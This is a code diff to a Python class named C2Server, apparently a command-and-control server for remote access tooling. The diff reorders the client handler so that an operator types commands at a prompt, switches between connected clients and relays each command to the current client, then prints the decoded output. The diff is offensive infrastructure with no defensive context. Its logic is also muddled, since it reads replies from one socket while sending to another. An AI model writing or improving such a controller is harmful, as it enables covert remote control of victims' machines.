@@ -25,8 +25,15 @@ class C2Server:
                 client_thread.start()
     
     def handle_client(self, client, addr):
+        print(client.recv(1024).decode())
         while True:
             try:
+                command = input()
+                if command.lower().strip() == "switch":
+                    with self.lock:
+                        self.switch_client()
+                if self.current_client:
+                    self.current_client.send(command.encode())
                 buf = b''
                 while True:
                     data = client.recv(4096)
@@ -34,13 +41,7 @@ class C2Server:
                         buf += data
                     else:
                         break
-                print(buf)
-                command = input()
-                if command.lower().strip() == "switch":
-                    with self.lock:
-                        self.switch_client()
-                if self.current_client:
-                    self.current_client.send(command.encode())
+                print(buf.decode())
             except Exception:
                 print(f"[*] Connection lost with {addr}")
                 with self.lock:
